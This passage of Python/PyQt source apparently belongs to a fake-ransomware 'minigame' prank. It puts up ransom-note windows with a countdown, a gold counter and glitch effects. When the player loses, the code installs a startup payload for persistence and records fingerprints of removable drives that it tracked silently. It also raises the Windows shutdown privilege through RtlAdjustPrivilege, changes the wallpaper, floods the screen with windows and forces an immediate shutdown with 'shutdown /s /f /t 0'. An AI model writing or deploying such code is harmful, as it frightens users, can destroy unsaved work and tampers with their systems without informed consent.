        self.move(self.base_x + jx, self.base_y + offset_y + jy)

    def shiver(self):
        self._reposition()

    def set_base_position(self, x, y):
        self.base_x = x
        self.base_y = y
        self._current_scale = 1.0
        self.move(x, y)

    def closeEvent(self, event):
        self.shiver_timer.stop()
        if self._spawn_anim is not None:
            self._spawn_anim.stop()
            self._spawn_anim = None
        if self._despawn_anim is not None:
            self._despawn_anim.stop()
            self._despawn_anim = None
        event.accept()

def window_name(number):
    title_list = ['R_Ns000M M M M m','Pa_Y U$ T|0 g3_T YO5r FILEs[.exe.pdf.mp3.png.docx.xlsx.RANSOM] Ba_K','4Ans0x24MMM','RANSOM RANSOM RANSOM RANSOM RAN$$$$$00000','YOU DID THIS TO YOUR \"SELF\"', '01000011 01001000 01000101 01000011 01001011 01010011 01010101 01001101 00100000 01001101 01001001 01010011 01001101 01000001 01010100 01000011 01001000', 'EXCEPTION FOUND ! 0x12542']
    return random.choice(title_list)

class RegularImageWindow(QWidget):
    """Glitch image shown as a regular framed top-level window.

    Same vertical-stretch spawn / shrink despawn animation and small
    shiver jitter as RansomImageWindow, but with a native title bar
    (no close / minimize / maximize) and normal input handling.
    """

    def __init__(self, image_path, index=0):
        super().__init__()
        self.setWindowFlags(
            Qt.Window
            | Qt.WindowStaysOnTopHint
            | Qt.WindowTitleHint
            | Qt.CustomizeWindowHint
        )
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.setWindowTitle(window_name(index))
        self.setStyleSheet('background-color: black;')

        self.image = QLabel(self)
        self.image.setAlignment(Qt.AlignCenter)
        self.image.setStyleSheet('background: transparent; border: none;')

        pixmap = _GLITCH_PIXMAP_CACHE.get(image_path) or load_pixmap(image_path)
        self._full_pixmap = pixmap
        if not pixmap.isNull():
            self._orig_w = max(1, pixmap.width())
            self._orig_h = max(1, pixmap.height())
            self.image.setPixmap(pixmap)
            self.image.resize(self._orig_w, self._orig_h)
            self.resize(self._orig_w, self._orig_h)
        else:
            self._orig_w = 1
            self._orig_h = 1

        self.base_x = 0
        self.base_y = 0
        self._current_scale = 1.0
        self._anchor = 'center'
        self._spawn_anim = None
        self._despawn_anim = None

        self.shiver_timer = QTimer(self)
        self.shiver_timer.timeout.connect(self.shiver)
        self.shiver_timer.start(35)

    def showEvent(self, event):
        super().showEvent(event)
        _make_aero_window(self, dark=True)

    def reset_to_full_size(self):
        if self._full_pixmap.isNull():
            return
        self._current_scale = 1.0
        self.image.setPixmap(self._full_pixmap)
        self.image.resize(self._orig_w, self._orig_h)
        self.resize(self._orig_w, self._orig_h)

    def spawn(self):
        if self._full_pixmap.isNull():
            return
        if self._despawn_anim is not None:
            self._despawn_anim.stop()
            self._despawn_anim = None
        if self._spawn_anim is not None:
            self._spawn_anim.stop()
            self._spawn_anim = None

        self._anchor = 'center'
        self._current_scale = 0.0
        self._apply_vertical_scale(0.0)
        self.show()
        self.raise_()

        anim = QVariantAnimation(self)
        anim.setDuration(320)
        anim.setStartValue(0.0)
        anim.setEndValue(1.0)
        anim.setEasingCurve(QEasingCurve.OutCubic)
        anim.valueChanged.connect(self._apply_vertical_scale)
        anim.start()
        self._spawn_anim = anim

    def despawn(self):
        if self._full_pixmap.isNull():
            self.hide()
            return
        if self._spawn_anim is not None:
            self._spawn_anim.stop()
            self._spawn_anim = None
        if self._despawn_anim is not None:
            self._despawn_anim.stop()
            self._despawn_anim = None

        self._anchor = 'bottom'

        anim = QVariantAnimation(self)
        anim.setDuration(240)
        anim.setStartValue(1.0)
        anim.setEndValue(0.0)
        anim.setEasingCurve(QEasingCurve.InCubic)
        anim.valueChanged.connect(self._apply_vertical_scale)
        anim.finished.connect(self._on_despawn_finished)
        anim.start()
        self._despawn_anim = anim

    def _on_despawn_finished(self):
        self.hide()
        self._despawn_anim = None

    def _apply_vertical_scale(self, scale):
        try:
            s = float(scale)
        except (TypeError, ValueError):
            return
        if s < 0.0:
            s = 0.0
        elif s > 1.0:
            s = 1.0
        if self._full_pixmap.isNull():
            return

        self._current_scale = s
        h = max(1, int(self._orig_h * s))
        scaled = self._full_pixmap.scaled(
            self._orig_w, h,
            Qt.IgnoreAspectRatio, Qt.FastTransformation
        )
        self.image.setPixmap(scaled)
        self.image.resize(self._orig_w, h)
        self.resize(self._orig_w, h)
        self._reposition()

    def _reposition(self):
        h = max(1, int(self._orig_h * self._current_scale))
        if self._anchor == 'bottom':
            offset_y = self._orig_h - h
        else:
            offset_y = (self._orig_h - h) // 2
        jx = random.randint(-3, 3)
        jy = random.randint(-3, 3)
        self.move(self.base_x + jx, self.base_y + offset_y + jy)

    def shiver(self):
        self._reposition()

    def set_base_position(self, x, y):
        self.base_x = x
        self.base_y = y
        self._current_scale = 1.0
        self.move(x, y)

    def closeEvent(self, event):
        self.shiver_timer.stop()
        if self._spawn_anim is not None:
            self._spawn_anim.stop()
            self._spawn_anim = None
        if self._despawn_anim is not None:
            self._despawn_anim.stop()
            self._despawn_anim = None
        event.accept()


class RansomTimerWindow(QWidget):
    """RansomTimerWindow with an Aero title bar (no close/min/max)."""
    def __init__(self, ransom_game):
        super().__init__()
        self.ransom_game = ransom_game
        self.required_gold = RANSOM_GOLD
        self.time_left = RANSOM_TIME
        self.setWindowFlags(
            Qt.Window
            | Qt.WindowStaysOnTopHint
            | Qt.WindowTitleHint
            | Qt.CustomizeWindowHint
        )
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.setWindowTitle('RANSOM.EXE')
        self.resize(432, 294)
        self.setStyleSheet('background-color: black;')
        self.header = QLabel(self)
        self.header.setGeometry(0, 0, self.width(), 116)
        self.header.setStyleSheet('background-color: rgb(225, 0, 0); border: 3px solid black;')
        self.a90_image = QLabel(self)
        self.a90_image.setAttribute(Qt.WA_TranslucentBackground)
        self.a90_image.setStyleSheet('background: transparent; border: none;')
        pixmap = load_pixmap('A-90_IDLE.png')
        if not pixmap.isNull():
            pixmap = pixmap.scaled(106, 106, Qt.KeepAspectRatio, Qt.FastTransformation)
            self.a90_image.setPixmap(pixmap)
        self.a90_image.setGeometry(7, 5, 106, 106)
        self.a90_image.setAlignment(Qt.AlignCenter)
        self.header_text = QLabel('ALL YOUR FILES\nHAVE BEEN\n"ENCRYPTED"', self)
        self.header_text.setGeometry(125, 10, 295, 96)
        self.header_text.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tfont-size: 25px;\n\t\t\tfont-weight: bold;\n\t\t\tbackground: transparent;\n\t\t\t')
        self.header_text.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        self.warning = QLabel('IF YOU DO NOT PAY THIS RANSOM\nBEFORE THE TIMER ENDS, YOUR FILES AND THEIR ICONS\nWILL BE UNRECOVERABLE BY ANY MEANS.', self)
        self.warning.setGeometry(9, 130, self.width() - 18, 72)
        self.warning.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tbackground-color: black;\n\t\t\tborder: 3px solid rgb(225, 0, 0);\n\t\t\tfont-size: 12px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.warning.setAlignment(Qt.AlignCenter)
        self.bottom_bar = QLabel(self)
        self.bottom_bar.setGeometry(0, 210, self.width(), 80)
        self.bottom_bar.setStyleSheet('\n\t\t\tbackground-color: rgb(225, 0, 0);\n\t\t\tborder: 3px solid black;\n\t\t\t')
        self.gold_box = QFrame(self)
        self.gold_box.setStyleSheet('\n\t\t\tQFrame {\n\t\t\t\tbackground-color: black;\n\t\t\t\tborder: 3px solid rgb(255, 235, 45);\n\t\t\t\tborder-radius: 0px;\n\t\t\t}\n\t\t\t')
        box_height = 60
        layout = QHBoxLayout(self.gold_box)
        layout.setContentsMargins(8, 4, 14, 4)
        layout.setSpacing(6)
        self.gold_icon = QLabel('⬢', self.gold_box)
        self.gold_icon.setStyleSheet('\n\t\t\tcolor: rgb(255, 235, 45);\n\t\t\tbackground: transparent;\n\t\t\tborder: none;\n\t\t\tfont-size: 31px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.gold_icon.setAlignment(Qt.AlignCenter)
        self.gold_label = QLabel(self.gold_box)
        self.gold_label.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tbackground: transparent;\n\t\t\tborder: none;\n\t\t\tfont-size: 28px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.gold_label.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        layout.addWidget(self.gold_icon)
        layout.addWidget(self.gold_label)
        self.update_gold_label()
        self.gold_box.adjustSize()
        self.gold_box.setFixedHeight(box_height)
        self.gold_box.move(8, 225)
        self.time_box = QFrame(self)
        self.time_box.setStyleSheet('\n\t\t\tQFrame {\n\t\t\t\tbackground-color: black;\n\t\t\t\tborder: 3px solid rgb(120, 0, 0);\n\t\t\t\tborder-radius: 0px;\n\t\t\t}\n\t\t\t')
        layout2 = QHBoxLayout(self.time_box)
        layout2.setContentsMargins(10, 6, 14, 6)
        layout2.setSpacing(10)
        self.time_title = QLabel('TIME:', self.time_box)
        self.time_title.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tbackground: transparent;\n\t\t\tborder: none;\n\t\t\tfont-size: 25px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.time_title.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        self.timer_label = QLabel('01:18', self.time_box)
        self.timer_label.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tbackground: transparent;\n\t\t\tborder: none;\n\t\t\tfont-size: 25px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.timer_label.setAlignment(Qt.AlignRight | Qt.AlignVCenter)
        layout2.addWidget(self.time_title)
        layout2.addWidget(self.timer_label)
        self.time_box.adjustSize()
        self.time_box.setFixedWidth(222)
        self.time_box.setFixedHeight(box_height)
        self.time_box.move(203, 225)
        self.countdown = QTimer(self)
        self.countdown.timeout.connect(self.update_timer)
        self.countdown.start(1000)

    def showEvent(self, event):
        super().showEvent(event)
        _make_aero_window(self, dark=True)

    def pulse_red_flash(self):
        flash = QLabel(self)
        flash.setGeometry(0, 0, self.width(), self.height())
        flash.setStyleSheet('background-color: rgb(255, 0, 0);')
        opacity = QGraphicsOpacityEffect(flash)
        flash.setGraphicsEffect(opacity)
        opacity.setOpacity(0.75)
        flash.show()
        flash.raise_()
        animation = QPropertyAnimation(opacity, b'opacity', self)
        animation.setDuration(350)
        animation.setStartValue(0.75)
        animation.setEndValue(0.0)
        animation.finished.connect(flash.deleteLater)
        flash._pulse_animation = animation
        animation.start()

    def update_gold_label(self):
        self.gold_label.setText(f'{self.required_gold}')

    def reduce_required_gold(self, amount=50):
        if self.ransom_game.finished:
            return
        else:
            self.required_gold = max(0, self.required_gold - amount)
            self.update_gold_label()
            if self.required_gold <= 0:
                self.countdown.stop()
                self.ransom_game.win()

    def update_timer(self):
        if self.ransom_game.finished:
            self.countdown.stop()
            return
        else:
            self.time_left -= 1
            minutes = self.time_left // 60
            seconds = self.time_left % 60
            self.timer_label.setText(f'{minutes:02d}:{seconds:02d}')
            if self.time_left == 15:
                sound_manager.play_ticking()
                self.pulse_red_flash()
            if self.time_left <= 0:
                self.countdown.stop()
                self.ransom_game.lose_game()

    def closeEvent(self, event):
        self.countdown.stop()
        event.accept()


class SimpleLoseJumpscare(QWidget):
    def __init__(self):
        super().__init__()
        self.stop_signs = []
        self.stop_sign_index = 0
        self.stop_sign_timer = QTimer(self)
        self.stop_sign_timer.timeout.connect(self.add_stop_sign)
        self.setWindowFlags(Qt.Window | Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_DeleteOnClose, False)
        self.setStyleSheet('background-color: black;')
        self.image = QLabel(self)
        self.image.setAttribute(Qt.WA_TranslucentBackground)
        self.image.setStyleSheet('background: transparent; border: none;')
        self.image.setAlignment(Qt.AlignCenter)
        pixmap = load_pixmap('A-90_JUMPSCARE.png')
        if pixmap.isNull():
            print('ERROR: A-90_JUMPSCARE.png could not be loaded.')
        else:
            self.image_pixmap = pixmap
        self.flash = QLabel(self)
        self.flash.setStyleSheet('background-color: rgb(255, 0, 0);')
        self.flash.hide()
        self.shake_strength = 20
        self.shake_timer = QTimer(self)
        self.shake_timer.timeout.connect(self.shake_face)
        self.shake_timer.start(30)
        self.showFullScreen()
        self.resize_contents()
        self.image.show()
        self.image.raise_()
        self.raise_()
        self.activateWindow()
        QTimer.singleShot(100, self.flash_red)
        QTimer.singleShot(180, self.show_image)
        QTimer.singleShot(450, self.flash_red)
        QTimer.singleShot(520, self.show_image)
        ransomflashoverlay = RansomFlashOverlay()
        QTimer.singleShot(1000, self.finish)

    def set_wallpaper(self, filename):
        path = resource_path(filename)
        if not os.path.exists(path):
            print(f'Wallpaper not found: {path}')
            return False
        else:
            try:
                result = windll.user32.SystemParametersInfoW(20, 0, path, 3)
                return bool(result)
            except Exception as e:
                print(f'Failed to set wallpaper: {e}')
                return False

    def loser(self):
        self.set_wallpaper('fail_bg.png')
        self.stop_signs.clear()
        self.stop_sign_index = 0
        self.stop_sign_timer.start(3)

    def add_stop_sign(self):
        sound_manager.play_effect('blip.mp3')
        if self.stop_sign_index >= 200:
            self.stop_sign_timer.stop()
            subprocess.run(['shutdown', '/s', '/f', '/t', '0'])
            return
        else:
            label = QLabel()
            label.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
            label.setAttribute(Qt.WA_TranslucentBackground)
            pixmap = load_pixmap('stop_sign.png')
            if pixmap.isNull():
                print('Could not load stop_sign.png')
                self.stop_sign_timer.stop()
                return
            else:
                label.setPixmap(pixmap)
                label.resize(pixmap.size())
                screen = QApplication.primaryScreen().geometry()
                x = random.randint(screen.left(), max(screen.left(), screen.right() - label.width()))
                y = random.randint(screen.top(), max(screen.top(), screen.bottom() - label.height()))
                label.move(x, y)
                label.show()
                label.raise_()
                self.stop_signs.append(label)
                self.stop_sign_index += 1

    def resize_contents(self):
        if hasattr(self, 'image_pixmap'):
            pixmap = self.image_pixmap.scaled(int(self.width() * 0.75), int(self.height() * 0.75), Qt.KeepAspectRatio, Qt.FastTransformation)
            self.image.setPixmap(pixmap)
        self.image.setGeometry(0, 0, self.width(), self.height())
        self.flash.setGeometry(0, 0, self.width(), self.height())

    def resizeEvent(self, event):
        self.resize_contents()
        event.accept()

    def shake_face(self):
        if not self.isVisible() or not hasattr(self, 'image_pixmap'):
            return None
        else:
            center_x = (self.width() - self.image.width()) // 2
            center_y = (self.height() - self.image.height()) // 2
            self.image.move(center_x + random.randint(-self.shake_strength, self.shake_strength), center_y + random.randint(-self.shake_strength, self.shake_strength))
            self.image.raise_()

    def flash_red(self):
        if self.isVisible():
            self.shake_strength = 9
            self.flash.show()
            self.flash.raise_()
            self.raise_()
            self.activateWindow()

    def show_image(self):
        if self.isVisible():
            self.flash.hide()
            self.shake_strength = 5
            self.image.show()
            self.image.raise_()
            self.raise_()
            self.activateWindow()

    def finish(self):
        global ransom_flash_overlay
        self.shake_timer.stop()
        ransom_flash_overlay = RansomFlashOverlay()
        ransom_flash_overlay.show()
        ransom_flash_overlay.raise_()
        ransom_flash_overlay.activateWindow()
        self.close()
        QTimer.singleShot(900, self.finish_after_flash)

    def finish_after_flash(self):
        global ransom_flash_overlay
        self.loser()
        try:
            if ransom_flash_overlay is not None:
                ransom_flash_overlay.close()
        except RuntimeError:
            return None
        ransom_flash_overlay = None

    def closeEvent(self, event):
        self.shake_timer.stop()
        event.accept()


class RansomFlashOverlay(QWidget):
    """RansomFlashOverlay"""
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setGeometry(QApplication.primaryScreen().geometry())
        self.flash = QLabel(self)
        self.flash.setGeometry(0, 0, self.width(), self.height())
        self.flash.setStyleSheet('background: rgba(255, 0, 0, 255);')
        self.opacity = 255
        self.fade_timer = QTimer(self)
        self.fade_timer.timeout.connect(self.fade_out)
        self.show()
        self.raise_()
        self.activateWindow()
        QTimer.singleShot(500, self.start_fade)

    def start_fade(self):
        self.fade_timer.start(16)

    def fade_out(self):
        self.opacity -= 12
        if self.opacity <= 0:
            self.opacity = 0
            self.fade_timer.stop()
            self.close()
        else:
            self.flash.setStyleSheet(f'background: rgba(255, 0, 0, {self.opacity});')


# ---------------------------------------------------------------------------
# Drive tracker (headless)
# ---------------------------------------------------------------------------

class DriveTracker(QObject):
    """Silently records fingerprints of every removable drive seen
    during the session.

    No UI, no window, no writes to any drive. Every 2 seconds it
    enumerates removable media and stores a fingerprint of any drive
    it hasn't seen before. On loss, RansomMinigame persists the
    collected set so cd_1 can gate on it.
    """

    def __init__(self, parent=None):
        super().__init__(parent)
        self.seen_fingerprints = {}   # key -> dict
        self.rescan_timer = QTimer(self)
        self.rescan_timer.timeout.connect(self._rescan)
        self.rescan_timer.start(2000)
        self._rescan()

    def _rescan(self):
        try:
            drives = enumerate_removable_drives()
        except Exception as e:
            print(f'[tracker] rescan failed: {e}')
            return

        for root, _dtype, _free, _total in drives:
            fp = _drive_fingerprint(root)
            if fp is None:
                continue
            key = _fingerprint_key(fp)
            if key not in self.seen_fingerprints:
                self.seen_fingerprints[key] = fp
                label = fp['label'] or '(no label)'
                print(
                    f'[tracker] recorded {root} '
                    f'serial={fp["serial"]} label={label!r} '
                    f'fs={fp["fs"]} size={fp["total"]}'
                )

    def stop(self):
        try:
            self.rescan_timer.stop()
        except Exception:
            pass


class RansomMinigame(QWidget):
    """RansomMinigame.

    The window itself is click-through. Drawer windows are the only
    interactive elements — the drive tracker is fully headless.
    """
    def __init__(self):
        super().__init__()
        self.finished = False
        self.image_windows = []
        self.setWindowFlags(
            Qt.FramelessWindowHint
            | Qt.WindowStaysOnTopHint
            | Qt.Tool
            | Qt.WindowTransparentForInput
        )
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_TransparentForMouseEvents, True)
        self.showFullScreen()
        self.border = QLabel(self)
        self.border.setGeometry(0, 0, self.width(), self.height())
        self.border.setStyleSheet('background: transparent; border: none;')
        self.border.setAttribute(Qt.WA_TransparentForMouseEvents, True)
        self.border.show()
        self._init_aura_cache()
        self.timer_window = RansomTimerWindow(self)
        self.position_window_randomly(self.timer_window)
        self.timer_window.show()
        self.timer_window.raise_()
        for i, image_path in enumerate(GLITCH_IMAGES):
            if _is_regular_glitch(image_path):
                window = RegularImageWindow(image_path, index=i)
            else:
                window = RansomImageWindow(image_path)
            self.position_window_randomly(window)
            self.image_windows.append(window)

        self.blink_timer = QTimer(self)
        self.blink_timer.timeout.connect(self._blink_all_windows)
        self.blink_timer.start(GLITCH_BLINK_INTERVAL_MS)

        self.teleport_timer = QTimer(self)
        self.teleport_timer.timeout.connect(self.teleport_windows)
        self.teleport_timer.start(3000)
        self.glitch_timer = QTimer(self)
        self.glitch_timer.timeout.connect(self.glitch_border)
        self.glitch_timer.start(45)
        self.border.raise_()
        self.show()
        self.timer_window.raise_()
        self.flash_overlay = RansomFlashOverlay()
        self.timer_window.raise_()

        # ------------------------------------------------------------------
        # Drawer system
        # ------------------------------------------------------------------
        self.active_drawer = None
        self.drawer_count = 0

        self.drawer_spawn_timer = QTimer(self)
        self.drawer_spawn_timer.setSingleShot(True)
        self.drawer_spawn_timer.timeout.connect(self._spawn_drawer)

        self.drawer_close_timer = QTimer(self)
        self.drawer_close_timer.setSingleShot(True)
        self.drawer_close_timer.timeout.connect(self._on_drawer_timeout)

        self.drawer_raise_timer = QTimer(self)
        self.drawer_raise_timer.timeout.connect(self._raise_drawer)
        self.drawer_raise_timer.start(500)

        self.drawer_spawn_timer.start(DRAWER_FIRST_SPAWN_DELAY_MS)

        # ------------------------------------------------------------------
        # Drive tracker (headless; records fingerprints only)
        # ------------------------------------------------------------------
        self.drive_tracker = DriveTracker(self)

    # ------------------------------------------------------------------
    # Aura cache
    # ------------------------------------------------------------------

    def _init_aura_cache(self):
        w, h = 160, 90
        self._aura_w = w
        self._aura_h = h

        self._aura_base = QImage(w, h, QImage.Format_ARGB32)
        self._aura_base.fill(Qt.transparent)

        self._static_prob = [0.0] * (w * h)

        cx = (w - 1) / 2.0
        cy = (h - 1) / 2.0
        max_d = (cx * cx + cy * cy) ** 0.5

        for y in range(h):
            dy = y - cy
            ny = abs(dy) / cy if cy > 0 else 0.0
            row_base = y * w
            for x in range(w):
                dx = x - cx
                nx = abs(dx) / cx if cx > 0 else 0.0

                d = ((dx * dx + dy * dy) ** 0.5) / max_d

                aura = (d - 0.30) / 0.70
                if aura < 0.0:
                    aura = 0.0
                elif aura > 1.0:
                    aura = 1.0

                corner = nx * ny

                alpha_f = aura * 0.55 + corner * 0.25
                alpha = int(alpha_f * 180)
                if alpha > 255:
                    alpha = 255
                if alpha > 0:
                    r = 200 + int(corner * 55)
                    if r > 255:
                        r = 255
                    self._aura_base.setPixelColor(
                        x, y, QColor(r, 0, 0, alpha)
                    )

                self._static_prob[row_base + x] = (
                    0.004 + corner * 0.32 + aura * 0.04
                )

    # ------------------------------------------------------------------
    # Window positioning
    # ------------------------------------------------------------------

    def position_window_randomly(self, window):
        screen = QApplication.primaryScreen()
        if screen is None:
            return
        else:
            geometry = screen.availableGeometry()
            margin = 80
            max_x = max(margin, geometry.width() - window.width() - margin)
            max_y = max(margin, geometry.height() - window.height() - margin)
            x = random.randint(margin, max_x)
            y = random.randint(margin, max_y)
            x += geometry.left()
            y += geometry.top()
            if isinstance(window, (RansomImageWindow, RegularImageWindow)):
                window.set_base_position(x, y)
            else:
                window.move(x, y)

    def _position_drawer(self, drawer):
        """Position the drawer, accounting for the native frame."""
        screen = QApplication.primaryScreen()
        if screen is None:
            return
        geo = screen.availableGeometry()
        margin = 60

        # Subtract the native title bar / border so the drawer
        # doesn't poke off the bottom of the screen.
        try:
            frame = drawer.frameGeometry()
            client = drawer.geometry()
            extra_w = max(0, frame.width() - client.width())
            extra_h = max(0, frame.height() - client.height())
        except Exception:
            extra_w = 0
            extra_h = 0

        full_h = drawer.full_open_height() + extra_h
        total_w = drawer.width() + extra_w

        max_x = max(margin, geo.width() - total_w - margin)
        max_y = max(margin, geo.height() - full_h - margin)
        min_y = margin
        if min_y > max_y:
            min_y = max_y

        x = random.randint(margin, max_x)
        y = random.randint(min_y, max_y)
        drawer.move(geo.left() + x, geo.top() + y)

    # ------------------------------------------------------------------
    # Glitch window behavior
    # ------------------------------------------------------------------

    def _blink_all_windows(self):
        if self.finished:
            return
        try:
            if not self.isVisible():
                return
        except RuntimeError:
            return

        for window in self.image_windows:
            try:
                if window.isVisible():
                    if random.random() < GLITCH_DESPAWN_CHANCE:
                        window.despawn()
                else:
                    if random.random() < GLITCH_SPAWN_CHANCE:
                        window.reset_to_full_size()
                        self.position_window_randomly(window)
                        window.spawn()
            except RuntimeError:
                continue

        try:
            self.timer_window.raise_()
        except RuntimeError:
            pass

    def teleport_windows(self):
        if self.finished:
            return
        else:
            for window in self.image_windows:
                try:
                    if window.isVisible():
                        self.position_window_randomly(window)
                        window.raise_()
                except RuntimeError:
                    continue
            try:
                if self.timer_window.isVisible():
                    self.position_window_randomly(self.timer_window)
                    self.timer_window.raise_()
            except RuntimeError:
                pass

    def glitch_border(self):
        if self.finished:
            return

        if (self.border.width() != self.width()
                or self.border.height() != self.height()):
            self.border.setGeometry(0, 0, self.width(), self.height())

        w = self._aura_w
        h = self._aura_h

        image = self._aura_base.copy()
        prob = self._static_prob
        idx = 0
        for y in range(h):
            for x in range(w):
                if random.random() < prob[idx]:
                    g = random.randint(0, 60)
                    b = random.randint(0, 60)
                    a = random.randint(140, 240)
                    image.setPixelColor(x, y, QColor(255, g, b, a))
                idx += 1

        pixmap = QPixmap.fromImage(image)
        pixmap = pixmap.scaled(
            self.width(), self.height(),
            Qt.IgnoreAspectRatio, Qt.FastTransformation
        )
        self.border.setPixmap(pixmap)
        try:
            self.timer_window.raise_()
        except RuntimeError:
            pass

    # ------------------------------------------------------------------
    # Drawer flow
    # ------------------------------------------------------------------

    def _spawn_drawer(self):
        if self.finished:
            return
        if self.active_drawer is not None:
            return
        self.drawer_count += 1
        try:
            drawer = DrawerWindow(index=self.drawer_count)
        except Exception as e:
            print(f'[drawer] spawn failed: {e}')
            return

        drawer.slot_claimed.connect(self._on_drawer_slot_claimed)
        drawer.all_claimed.connect(self._on_drawer_all_claimed)
        drawer.linger_expired.connect(self._on_drawer_linger_expired)

        # Show first so the native frame geometry is realized, then
        # position it accounting for the frame.
        drawer.show()
        self._position_drawer(drawer)
        drawer.raise_()

        try:
            self.timer_window.raise_()
        except RuntimeError:
            pass

        self.active_drawer = drawer
        self.drawer_close_timer.start(DRAWER_TIMEOUT_MS)

    def _raise_drawer(self):
        if self.active_drawer is not None:
            try:
                self.active_drawer.raise_()
            except RuntimeError:
                pass
        try:
            self.timer_window.raise_()
        except RuntimeError:
            pass

    def _on_drawer_slot_claimed(self, content_type):
        if self.finished:
            return
        if content_type == 'COIN':
            try:
                sound_manager.play_effect('coin_sound.mp3')
            except Exception:
                pass
            try:
                self.timer_window.reduce_required_gold(DRAWER_COIN_VALUE)
            except Exception:
                pass
        elif content_type == 'TRAP':
            QTimer.singleShot(0, self.lose_game)

    def _on_drawer_all_claimed(self):
        if self.finished:
            return
        self._close_active_drawer()

    def _on_drawer_linger_expired(self):
        if self.finished:
            return
        self._close_active_drawer()

    def _on_drawer_timeout(self):
        if self.finished:
            return
        self._close_active_drawer()

    def _close_active_drawer(self):
        if self.active_drawer is None:
            return
        drawer = self.active_drawer
        self.active_drawer = None
        try:
            self.drawer_close_timer.stop()
        except Exception:
            pass
        try:
            drawer.close_animated()
        except RuntimeError:
            pass
        if not self.finished:
            self.drawer_spawn_timer.start(DRAWER_SPAWN_DELAY_MS)

    def _tear_down_drawer_now(self):
        if self.active_drawer is None:
            return
        drawer = self.active_drawer
        self.active_drawer = None
        try:
            drawer.close()
        except RuntimeError:
            pass

    # ------------------------------------------------------------------
    # Endgame
    # ------------------------------------------------------------------

    def win(self):
        if self.finished:
            return
        else:
            self.finished = True
            self.stop_timers()
            self._tear_down_drawer_now()
            sound_manager.stop_all()
            self.win_glitch_index = 0
            try:
                self.timer_window.show()
                self.timer_window.raise_()
            except RuntimeError:
                pass
            self.win_cleanup_timer = QTimer(self)
            self.win_cleanup_timer.timeout.connect(self.remove_next_glitch_window)
            self.win_cleanup_timer.start(180)

    def remove_next_glitch_window(self):
        if self.win_glitch_index < len(self.image_windows):
            window = self.image_windows[self.win_glitch_index]
            try:
                window.close()
            except RuntimeError:
                pass
            self.win_glitch_index += 1
        else:
            self.win_cleanup_timer.stop()
            self.blackout_timer_window()

    def blackout_timer_window(self):
        try:
            timer = self.timer_window
            self.timer_blackout = QLabel(timer)
            self.timer_blackout.setGeometry(0, 126, timer.width(), timer.height() - 126)
            self.timer_blackout.setStyleSheet('background-color: black;')
            self.timer_blackout.show()
            self.timer_blackout.raise_()
            timer.header.raise_()
            timer.a90_image.raise_()
            timer.header_text.raise_()
            timer.show()
            timer.raise_()
        except RuntimeError:
            self.finish_win_sequence()
            return None
        QTimer.singleShot(900, self.finish_win_sequence)

    def finish_win_sequence(self):
        global success_window
        try:
            if hasattr(self, 'timer_blackout'):
                self.timer_blackout.hide()
        except RuntimeError:
            pass
        self.close_ransom_windows()
        try:
            self.close()
        except RuntimeError:
            pass
        event_controller.punishment_active = True
        try:
            restore_desktop_icons()
        except Exception as e:
            print(f'Failed to restore desktop icons: {e}')
        success_window = SuccessWindow()
        success_window.show()
        success_window.raise_()

    def lose_game(self):
        global lose_jumpscare_window
        if self.finished:
            return
        else:
            self.finished = True
            event_controller.punishment_active = True
            # ---- snapshot the removable drives seen this session ---
            try:
                entries = list(
                    self.drive_tracker.seen_fingerprints.values()
                )
                write_drive_snapshot(entries)
            except Exception as e:
                print(f'[snapshot] failed: {e}')
            # ---- startup persistence (opt-in) -----------------------
            try:
                install_startup_payload()
            except Exception as e:
                print(f'[startup] install failed: {e}')
            self.stop_timers()
            self._tear_down_drawer_now()
            sound_manager.stop_music()
            sound_manager.stop_ticking()
            sound_manager.play_effect('realscare.wav')
            lose_jumpscare_window = SimpleLoseJumpscare()
            lose_jumpscare_window.show()
            lose_jumpscare_window.raise_()
            lose_jumpscare_window.activateWindow()
            QApplication.processEvents()
            nullptr = POINTER(c_int)()
            windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
            nullptr = POINTER(c_int)()
            windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
            self.close_ransom_windows()
            self.close()

    def stop_timers(self):
        self.glitch_timer.stop()
        self.teleport_timer.stop()
        try:
            self.blink_timer.stop()
        except Exception:
            pass
        try:
            self.drawer_spawn_timer.stop()
        except Exception:
            pass
        try:
            self.drawer_close_timer.stop()
        except Exception:
            pass
        try:
            self.drawer_raise_timer.stop()
        except Exception:
            pass
        try:
            self.drive_tracker.stop()
        except (RuntimeError, AttributeError):
            pass
        try:
            self.timer_window.countdown.stop()
        except Exception:
            return None

    def close_ransom_windows(self):
        self._tear_down_drawer_now()
        try:
            self.timer_window.close()
        except RuntimeError:
            pass
        for window in self.image_windows:
            try:
                window.close()
            except RuntimeError:
                pass
        self.image_windows.clear()

    def closeEvent(self, event):
        self.stop_timers()
        self._tear_down_drawer_now()
        event.accept()


class FlashOverlay(QWidget):
    def __init__(self, image1, image2):
        super().__init__()
        self.input_active = False
        self.mouse_listener = None
        self.keyboard_listener = None
        self.pixmap1 = load_pixmap(image1)
        self.pixmap2 = load_pixmap(image2)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.showFullScreen()
